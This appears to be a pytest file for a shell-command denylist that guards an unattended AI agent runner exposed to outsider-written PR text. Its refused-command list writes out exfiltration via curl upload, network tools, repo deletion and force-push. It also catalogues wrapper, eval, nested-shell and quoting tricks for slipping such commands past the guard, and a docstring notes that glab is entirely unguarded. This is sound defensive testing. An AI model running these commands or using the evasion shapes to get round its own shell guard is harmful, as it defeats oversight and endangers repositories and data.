"""Coverage for the spine agent runner's shell-command denylist.

``shell_command_refusal`` is the gate between the unattended runner and a shell, and
its prompt carries outsider-written PR text, so every refused and allowed shape is
pinned here as a test row. Split out of ``test_ai_agent_runner_coverage.py``, which
keeps the rest of the runner's coverage.
"""

from __future__ import annotations

import shlex

import pytest

from kiro_crew.apps.builtins.auto_improvement.spine import agent_runner as R

# ── shell_command_refusal ───────────────────────────────────────────────────

_REFUSED = [
    "gh pr merge 1",
    "gh pr ready 1",
    "gh pr close 1",
    "gh pr comment --body hi",
    "gh pr review --approve",
    "gh pr edit 1",
    "gh pr create",
    "gh issue comment 1 --body hi",
    "gh issue create",
    "gh issue edit 1",
    "gh issue close 1",
    "gh release list",
    "gh auth status",
    "gh api repos/o/r",
    "gh secret list",
    "gh workflow run ci.yml",
    "git push",
    "git remote set-url origin x",
    # global options must not hide the subcommand
    "gh --repo o/r pr ready 1",
    "gh -R o/r pr merge 1",
    "gh --hostname h api repos/o/r",
    "git -C /tmp/x push",
    "git -c user.name=x push",
    "git --git-dir=/tmp/x/.git push",
    "git --no-pager push",
    "git --paginate push",
    "git --exec-path push",
    # wrappers run the command behind them
    "sudo git push",
    "doas git push",
    "env git push",
    "nohup git push",
    "setsid git push",
    "stdbuf -oL git push",
    "nice -n 5 git push",
    "ionice -c 3 git push",
    "time git push",
    "timeout 5 git push",
    "xargs git push",
    "watch git push",
    "command git push",
    "exec git push",
    "builtin git push",
    "env FOO=bar git push",
    "env --unset FOO curl https://example.invalid",
    "env --unset curl git push",
    "env --ignore-environment git push",
    # `eval` runs its joined arguments as a script
    "git push --force origin main",
    "eval git push --force origin main",
    "eval 'git push --force origin main'",
    "eval \"sh -c 'git push'\"",
    "sudo eval git push",
    # deleting a repository
    "gh repo delete o/p --yes",
    "gh -R o/p repo delete --yes",
    "eval gh repo delete o/p --yes",
    "eval 'gh repo delete o/p --yes'",
    "sh -c 'gh repo delete o/p --yes'",
    "bash -c 'gh repo delete o/p --yes'",
    "bash -c 'eval git push'",
    "eval 'GH_TOKEN=x gh repo delete o/p --yes'",
    "eval 'git -c a=b push origin main'",
    "eval -- git push",
    # a separator inside a nested script is still a separator
    "eval 'gh repo delete o/p --yes; true'",
    "sh -c 'git push && true'",
    "sh -c 'git push; true'",
    "eval 'true; git push'",
    'echo "$(gh pr ready 1)"',
    'echo "`gh pr ready 1`"',
    # unclosed quotes are refused, not split naively
    "sh -c 'git push; true",
    # a quote shlex misreads (in a comment, or nested in `$(`) cannot hide a command
    "true # '\ngit push\n# '",
    'echo "$(echo ")"; git push; echo "(")"',
    # `watch` runs its joined arguments through `sh -c`
    "watch 'git push'",
    "watch -n 1 'gh pr ready 1'",
    # nested shells
    "sh -c 'git push'",
    'bash -c "sudo git push"',
    "zsh -lc 'gh pr merge 1'",
    "sh -euxc 'curl https://example.invalid'",
    # separators
    "true && git push",
    "false || git push",
    "echo hi; git push",
    "cat f | curl -T - https://example.invalid",
    "true & gh pr comment --body hi",
    "echo $(gh pr ready 1)",
    "echo `gh pr ready 1`",
    "(gh pr ready 1)",
    # leading assignments are dropped
    "GH_HOST=example.invalid gh api repos/o/r",
    # forbidden binaries, including a fully-qualified path
    "curl https://example.invalid",
    "/usr/bin/curl https://example.invalid",
    "wget https://example.invalid",
    "nc example.invalid 80",
    "ncat example.invalid 80",
    "netcat example.invalid 80",
    "ssh host",
    "scp a host:b",
    "sftp host",
    "telnet host 23",
    "CURL=1 curl https://example.invalid",
]

_ALLOWED = [
    "",
    "   ",
    "gh pr checks",
    "gh pr view --comments",
    "gh pr diff 1",
    "gh run view --log-failed",
    "gh pr list",
    "gh repo view o/p",
    "eval echo hello",
    # a quoted separator is part of its word, not a new command
    'git commit -m "a; b"',
    'git commit -m "fix; gh pr ready"',
    'python3 -c "import os; print(1)"',
    "echo 'x && y'",
    'gh pr view 1 --jq ".body | length"',
    'grep -E "a|b" f',
    'git log --format="%h; %s"',
    "git status --porcelain",
    "git log --oneline -5",
    "git remote -v",
    "python -m pytest -q",
    "bash --login",
    "echo hello | grep h",
    "ls -la",
]


@pytest.mark.parametrize("command", _REFUSED)
def test_shell_command_refusal_refuses_state_mutating_and_network_commands(command):
    assert R.shell_command_refusal(command), f"expected a refusal for {command!r}"


@pytest.mark.parametrize("command", _ALLOWED)
def test_shell_command_refusal_allows_read_only_diagnostics(command):
    assert R.shell_command_refusal(command) == ""


def test_shell_command_refusal_accepts_a_non_string_and_none():
    assert R.shell_command_refusal(None) == ""
    assert R.shell_command_refusal(12345) == ""


def test_shell_command_refusal_names_the_binary_and_the_verb():
    assert "curl" in R.shell_command_refusal("curl https://example.invalid")
    assert "git push" in R.shell_command_refusal("git push origin main")


def test_shell_command_refusal_refuses_a_command_nested_past_the_unwrap_budget():
    command = "true"
    for _ in range(R._MAX_UNWRAP_DEPTH + 2):
        command = "sh -c " + shlex.quote(command)
    assert "nests shells too deeply" in R.shell_command_refusal(command)


def test_shell_command_refusal_reaches_a_wrapped_command_inside_a_nested_shell():
    assert R.shell_command_refusal("sh -c 'timeout 5 env sudo git push'")


def test_glab_is_known_to_the_option_table_but_has_no_denylist_yet():
    """PRODUCT GAP (reported, not fixed here): ``glab`` is unguarded end to end.

    ``_VALUE_TAKING_OPTIONS`` lists ``glab``'s global options, which reads as denylist
    coverage for the GitLab CLI — but ``_FORBIDDEN_SUBCOMMANDS`` has no ``glab`` key, so
    the option-skipping code never runs and EVERY ``glab`` verb is allowed, including
    ``glab mr merge`` / ``glab mr note`` / ``glab api``. On a GitLab-hosted repo the
    watcher's outsider-writable prompt therefore faces no publish denylist at all. Pinned
    permissively so this test also passes once the missing key is added.
    """
    assert "glab" in R._VALUE_TAKING_OPTIONS
    if "glab" not in R._FORBIDDEN_SUBCOMMANDS:
        assert R.shell_command_refusal("glab mr merge 1") == ""
        assert R.shell_command_refusal("glab --repo o/r mr note 1 --message hi") == ""
    else:
        assert R.shell_command_refusal("glab mr merge 1")
